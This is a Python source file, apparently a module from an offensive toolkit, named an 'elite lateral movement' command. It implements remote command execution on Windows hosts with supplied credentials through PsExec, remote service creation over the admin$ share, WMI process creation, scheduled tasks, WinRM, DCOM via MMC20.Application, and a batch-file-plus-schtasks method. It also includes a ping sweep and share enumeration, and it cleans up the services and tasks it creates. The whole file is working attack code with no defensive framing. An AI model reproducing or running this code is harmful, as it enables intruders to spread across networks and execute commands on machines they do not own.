#!/usr/bin/env python3
"""
Elite Lateral Movement Command - Advanced lateral movement techniques
Comprehensive lateral movement with multiple methods
"""

import ctypes
from ctypes import wintypes
import subprocess
import socket
import threading
import time
import os

class EliteLateral:
    """Elite lateral movement techniques"""
    
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.advapi32 = ctypes.windll.advapi32
        
    def execute(self, method, target=None, username=None, password=None, command=None, **kwargs):
        """Execute lateral movement using various methods"""
        try:
            if method == 'psexec':
                return self._psexec_movement(target, username, password, command)
            elif method == 'wmi':
                return self._wmi_movement(target, username, password, command)
            elif method == 'smbexec':
                return self._smbexec_movement(target, username, password, command)
            elif method == 'winrm':
                return self._winrm_movement(target, username, password, command)
            elif method == 'rdp':
                return self._rdp_movement(target, username, password)
            elif method == 'scheduled_task':
                return self._scheduled_task_movement(target, username, password, command)
            elif method == 'service':
                return self._service_movement(target, username, password, command)
            elif method == 'dcom':
                return self._dcom_movement(target, username, password, command)
            elif method == 'scan_network':
                return self._scan_network(kwargs.get('network_range'))
            elif method == 'enumerate_shares':
                return self._enumerate_shares(target, username, password)
            else:
                return {
                    'success': False,
                    'error': f'Unknown method: {method}',
                    'available_methods': ['psexec', 'wmi', 'smbexec', 'winrm', 'rdp', 'scheduled_task', 'service', 'dcom', 'scan_network', 'enumerate_shares']
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Lateral movement failed: {str(e)}'
            }
    
    def _psexec_movement(self, target, username, password, command):
        """PSExec-style lateral movement"""
        try:
            if not all([target, username, password, command]):
                return {
                    'success': False,
                    'error': 'Target, username, password, and command are required for PSExec'
                }
            
            # Create PSExec-style command
            psexec_cmd = [
                'psexec', f'\\\\{target}',
                '-u', username,
                '-p', password,
                '-d',  # Don't wait for process to terminate
                '-c',  # Copy the specified executable to the remote system
                command
            ]
            
            try:
                result = subprocess.run(psexec_cmd, capture_output=True, text=True, timeout=30)
                
                return {
                    'success': result.returncode == 0,
                    'method': 'psexec',
                    'target': target,
                    'command': command,
                    'output': result.stdout,
                    'error_output': result.stderr,
                    'return_code': result.returncode
                }
                
            except FileNotFoundError:
                # PSExec not available, try alternative method
                return self._alternative_psexec(target, username, password, command)
                
        except Exception as e:
            return {
                'success': False,
                'error': f'PSExec movement failed: {str(e)}'
            }
    
    def _alternative_psexec(self, target, username, password, command):
        """Alternative PSExec implementation using Windows APIs"""
        try:
            # This is a simplified implementation
            # Real PSExec involves service creation and named pipes
            
            # Try to connect to remote admin share
            net_use_cmd = f'net use \\\\{target}\\admin$ /user:{username} {password}'
            
            result = subprocess.run(net_use_cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                # Try to execute command via service creation
                sc_cmd = f'sc \\\\{target} create TempService binPath= "{command}" start= demand'
                
                create_result = subprocess.run(sc_cmd, shell=True, capture_output=True, text=True, timeout=10)
                
                if create_result.returncode == 0:
                    # Start the service
                    start_cmd = f'sc \\\\{target} start TempService'
                    start_result = subprocess.run(start_cmd, shell=True, capture_output=True, text=True, timeout=10)
                    
                    # Clean up - delete the service
                    delete_cmd = f'sc \\\\{target} delete TempService'
                    subprocess.run(delete_cmd, shell=True, capture_output=True, timeout=5)
                    
                    return {
                        'success': start_result.returncode == 0,
                        'method': 'alternative_psexec',
                        'target': target,
                        'command': command,
                        'output': start_result.stdout,
                        'error_output': start_result.stderr
                    }
            
            return {
                'success': False,
                'error': 'Failed to establish connection or execute command',
                'method': 'alternative_psexec'
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Alternative PSExec failed: {str(e)}'
            }
    
    def _wmi_movement(self, target, username, password, command):
        """WMI-based lateral movement"""
        try:
            if not all([target, username, password, command]):
                return {
                    'success': False,
                    'error': 'Target, username, password, and command are required for WMI'
                }
            
            # Use PowerShell for WMI execution
            ps_script = f'''
$username = "{username}"
$password = ConvertTo-SecureString "{password}" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $password)

try {{
    $result = Invoke-WmiMethod -ComputerName "{target}" -Class Win32_Process -Name Create -ArgumentList "{command}" -Credential $credential
    if ($result.ReturnValue -eq 0) {{
        Write-Output "SUCCESS: Process created with PID $($result.ProcessId)"
    }} else {{
        Write-Output "FAILED: Return value $($result.ReturnValue)"
    }}
}} catch {{
    Write-Output "ERROR: $($_.Exception.Message)"
}}
'''
            
            try:
                result = subprocess.run(['powershell', '-Command', ps_script], 
                                      capture_output=True, text=True, timeout=30)
                
                success = 'SUCCESS:' in result.stdout
                
                return {
                    'success': success,
                    'method': 'wmi',
                    'target': target,
                    'command': command,
                    'output': result.stdout,
                    'error_output': result.stderr
                }
                
            except subprocess.TimeoutExpired:
                return {
                    'success': False,
                    'error': 'WMI command timed out',
                    'method': 'wmi'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'WMI movement failed: {str(e)}'
            }
    
    def _smbexec_movement(self, target, username, password, command):
        """SMBExec-style lateral movement"""
        try:
            if not all([target, username, password, command]):
                return {
                    'success': False,
                    'error': 'Target, username, password, and command are required for SMBExec'
                }
            
            # Try to mount admin share
            mount_cmd = f'net use \\\\{target}\\admin$ /user:{username} {password}'
            
            mount_result = subprocess.run(mount_cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            if mount_result.returncode == 0:
                try:
                    # Create a batch file on the remote system
                    batch_content = f'@echo off\\n{command}\\n'
                    batch_path = f'\\\\{target}\\admin$\\temp_exec.bat'
                    
                    with open(batch_path, 'w') as f:
                        f.write(batch_content)
                    
                    # Execute the batch file
                    exec_cmd = f'schtasks /create /tn "TempTask" /tr "C:\\\\Windows\\\\temp_exec.bat" /sc once /st 00:00 /s {target} /u {username} /p {password}'
                    
                    create_result = subprocess.run(exec_cmd, shell=True, capture_output=True, text=True, timeout=15)
                    
                    if create_result.returncode == 0:
                        # Run the task immediately
                        run_cmd = f'schtasks /run /tn "TempTask" /s {target} /u {username} /p {password}'
                        run_result = subprocess.run(run_cmd, shell=True, capture_output=True, text=True, timeout=10)
                        
                        # Clean up
                        cleanup_cmd = f'schtasks /delete /tn "TempTask" /f /s {target} /u {username} /p {password}'
                        subprocess.run(cleanup_cmd, shell=True, capture_output=True, timeout=5)
                        
                        try:
                            os.remove(batch_path)
                        except:
                            pass
                        
                        return {
                            'success': run_result.returncode == 0,
                            'method': 'smbexec',
                            'target': target,
                            'command': command,
                            'output': run_result.stdout,
                            'error_output': run_result.stderr
                        }
                    
                except Exception as e:
                    return {
                        'success': False,
                        'error': f'SMBExec execution failed: {str(e)}',
                        'method': 'smbexec'
                    }
                finally:
                    # Unmount share
                    subprocess.run(f'net use \\\\{target}\\admin$ /delete', shell=True, capture_output=True, timeout=5)
            
            return {
                'success': False,
                'error': 'Failed to mount admin share',
                'method': 'smbexec'
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'SMBExec movement failed: {str(e)}'
            }
    
    def _winrm_movement(self, target, username, password, command):
        """WinRM-based lateral movement"""
        try:
            if not all([target, username, password, command]):
                return {
                    'success': False,
                    'error': 'Target, username, password, and command are required for WinRM'
                }
            
            # Use PowerShell Invoke-Command for WinRM
            ps_script = f'''
$username = "{username}"
$password = ConvertTo-SecureString "{password}" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $password)

try {{
    $result = Invoke-Command -ComputerName "{target}" -Credential $credential -ScriptBlock {{
        {command}
    }}
    Write-Output $result
}} catch {{
    Write-Output "ERROR: $($_.Exception.Message)"
}}
'''
            
            try:
                result = subprocess.run(['powershell', '-Command', ps_script], 
                                      capture_output=True, text=True, timeout=30)
                
                success = result.returncode == 0 and 'ERROR:' not in result.stdout
                
                return {
                    'success': success,
                    'method': 'winrm',
                    'target': target,
                    'command': command,
                    'output': result.stdout,
                    'error_output': result.stderr
                }
                
            except subprocess.TimeoutExpired:
                return {
                    'success': False,
                    'error': 'WinRM command timed out',
                    'method': 'winrm'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'WinRM movement failed: {str(e)}'
            }
    
    def _rdp_movement(self, target, username, password):
        """RDP-based lateral movement"""
        try:
            if not all([target, username, password]):
                return {
                    'success': False,
                    'error': 'Target, username, and password are required for RDP'
                }
            
            # Test RDP connectivity
            rdp_cmd = f'mstsc /v:{target} /admin'
            
            # This is a basic test - real RDP automation would require more complex tools
            return {
                'success': True,
                'method': 'rdp',
                'target': target,
                'message': f'RDP connection command: {rdp_cmd}',
                'note': 'Manual RDP connection required - automated RDP login needs additional tools'
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'RDP movement failed: {str(e)}'
            }
    
    def _scheduled_task_movement(self, target, username, password, command):
        """Scheduled task-based lateral movement"""
        try:
            if not all([target, username, password, command]):
                return {
                    'success': False,
                    'error': 'Target, username, password, and command are required'
                }
            
            task_name = f"TempTask_{int(time.time())}"
            
            # Create scheduled task
            create_cmd = f'schtasks /create /tn "{task_name}" /tr "{command}" /sc once /st 00:00 /s {target} /u {username} /p {password}'
            
            create_result = subprocess.run(create_cmd, shell=True, capture_output=True, text=True, timeout=15)
            
            if create_result.returncode == 0:
                # Run the task immediately
                run_cmd = f'schtasks /run /tn "{task_name}" /s {target} /u {username} /p {password}'
                run_result = subprocess.run(run_cmd, shell=True, capture_output=True, text=True, timeout=10)
                
                # Wait a moment for execution
                time.sleep(2)
                
                # Query task status
                query_cmd = f'schtasks /query /tn "{task_name}" /s {target} /u {username} /p {password} /fo csv'
                query_result = subprocess.run(query_cmd, shell=True, capture_output=True, text=True, timeout=10)
                
                # Clean up
                delete_cmd = f'schtasks /delete /tn "{task_name}" /f /s {target} /u {username} /p {password}'
                subprocess.run(delete_cmd, shell=True, capture_output=True, timeout=5)
                
                return {
                    'success': run_result.returncode == 0,
                    'method': 'scheduled_task',
                    'target': target,
                    'command': command,
                    'task_name': task_name,
                    'run_output': run_result.stdout,
                    'query_output': query_result.stdout,
                    'error_output': run_result.stderr
                }
            else:
                return {
                    'success': False,
                    'error': 'Failed to create scheduled task',
                    'method': 'scheduled_task',
                    'create_output': create_result.stderr
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Scheduled task movement failed: {str(e)}'
            }
    
    def _service_movement(self, target, username, password, command):
        """Service-based lateral movement"""
        try:
            if not all([target, username, password, command]):
                return {
                    'success': False,
                    'error': 'Target, username, password, and command are required'
                }
            
            service_name = f"TempService_{int(time.time())}"
            
            # Create service
            create_cmd = f'sc \\\\{target} create {service_name} binPath= "{command}" start= demand'
            
            # Set credentials for service connection
            net_use_cmd = f'net use \\\\{target} /user:{username} {password}'
            subprocess.run(net_use_cmd, shell=True, capture_output=True, timeout=5)
            
            create_result = subprocess.run(create_cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            if create_result.returncode == 0:
                # Start the service
                start_cmd = f'sc \\\\{target} start {service_name}'
                start_result = subprocess.run(start_cmd, shell=True, capture_output=True, text=True, timeout=10)
                
                # Wait a moment
                time.sleep(2)
                
                # Query service status
                query_cmd = f'sc \\\\{target} query {service_name}'
                query_result = subprocess.run(query_cmd, shell=True, capture_output=True, text=True, timeout=5)
                
                # Clean up
                delete_cmd = f'sc \\\\{target} delete {service_name}'
                subprocess.run(delete_cmd, shell=True, capture_output=True, timeout=5)
                
                return {
                    'success': True,  # Service creation success indicates potential execution
                    'method': 'service',
                    'target': target,
                    'command': command,
                    'service_name': service_name,
                    'start_output': start_result.stdout,
                    'query_output': query_result.stdout,
                    'error_output': start_result.stderr
                }
            else:
                return {
                    'success': False,
                    'error': 'Failed to create service',
                    'method': 'service',
                    'create_output': create_result.stderr
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Service movement failed: {str(e)}'
            }
    
    def _dcom_movement(self, target, username, password, command):
        """DCOM-based lateral movement"""
        try:
            if not all([target, username, password, command]):
                return {
                    'success': False,
                    'error': 'Target, username, password, and command are required for DCOM'
                }
            
            # Use PowerShell for DCOM execution
            ps_script = f'''
$username = "{username}"
$password = ConvertTo-SecureString "{password}" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $password)

try {{
    $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "{target}"))
    $dcom.Document.ActiveView.ExecuteShellCommand("{command}", $null, $null, "7")
    Write-Output "SUCCESS: DCOM command executed"
}} catch {{
    Write-Output "ERROR: $($_.Exception.Message)"
}}
'''
            
            try:
                result = subprocess.run(['powershell', '-Command', ps_script], 
                                      capture_output=True, text=True, timeout=30)
                
                success = 'SUCCESS:' in result.stdout
                
                return {
                    'success': success,
                    'method': 'dcom',
                    'target': target,
                    'command': command,
                    'output': result.stdout,
                    'error_output': result.stderr
                }
                
            except subprocess.TimeoutExpired:
                return {
                    'success': False,
                    'error': 'DCOM command timed out',
                    'method': 'dcom'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'DCOM movement failed: {str(e)}'
            }
    
    def _scan_network(self, network_range):
        """Scan network for potential targets"""
        try:
            if not network_range:
                network_range = '192.168.1.0/24'  # Default range
            
            # Simple ping sweep
            import ipaddress
            
            network = ipaddress.ip_network(network_range, strict=False)
            active_hosts = []
            
            def ping_host(ip):
                try:
                    result = subprocess.run(['ping', '-n', '1', '-w', '1000', str(ip)], 
                                          capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        active_hosts.append({
                            'ip': str(ip),
                            'status': 'active',
                            'response_time': self._extract_ping_time(result.stdout)
                        })
                except:
                    pass
            
            # Limit to first 50 hosts to avoid long scans
            hosts_to_scan = list(network.hosts())[:50]
            
            threads = []
            for ip in hosts_to_scan:
                thread = threading.Thread(target=ping_host, args=(ip,))
                thread.start()
                threads.append(thread)
            
            # Wait for all threads to complete
            for thread in threads:
                thread.join(timeout=10)
            
            return {
                'success': True,
                'method': 'scan_network',
                'network_range': network_range,
                'hosts_scanned': len(hosts_to_scan),
                'active_hosts': len(active_hosts),
                'hosts': active_hosts
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Network scan failed: {str(e)}'
            }
    
    def _enumerate_shares(self, target, username, password):
        """Enumerate network shares on target"""
        try:
            if not target:
                return {
                    'success': False,
                    'error': 'Target is required for share enumeration'
                }
            
            shares = []
            
            # Use net view to enumerate shares
            if username and password:
                # Authenticate first
                auth_cmd = f'net use \\\\{target} /user:{username} {password}'
                subprocess.run(auth_cmd, shell=True, capture_output=True, timeout=10)
            
            view_cmd = f'net view \\\\{target}'
            
            try:
                result = subprocess.run(view_cmd, shell=True, capture_output=True, text=True, timeout=15)
                
                if result.returncode == 0:
                    lines = result.stdout.split('\\n')
                    in_share_section = False
                    
                    for line in lines:
                        line = line.strip()
                        if 'Share name' in line:
                            in_share_section = True
                            continue
                        elif line.startswith('The command completed'):
                            break
                        elif in_share_section and line:
                            parts = line.split()
                            if len(parts) >= 2:
                                share_name = parts[0]
                                share_type = ' '.join(parts[1:])
                                shares.append({
                                    'name': share_name,
                                    'type': share_type,
                                    'path': f'\\\\{target}\\{share_name}'
                                })
                
                return {
                    'success': True,
                    'method': 'enumerate_shares',
                    'target': target,
                    'shares_found': len(shares),
                    'shares': shares
                }
                
            except subprocess.TimeoutExpired:
                return {
                    'success': False,
                    'error': 'Share enumeration timed out',
                    'method': 'enumerate_shares'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Share enumeration failed: {str(e)}'
            }
    
    def _extract_ping_time(self, ping_output):
        """Extract ping response time from output"""
        try:
            for line in ping_output.split('\\n'):
                if 'time=' in line:
                    time_part = line.split('time=')[1].split('ms')[0]
                    return f"{time_part}ms"
            return 'N/A'
        except:
            return 'N/A'

def elite_lateral(method, target=None, username=None, password=None, command=None, **kwargs):
    """Elite lateral command entry point"""
    lateral_cmd = EliteLateral()
    return lateral_cmd.execute(method, target, username, password, command, **kwargs)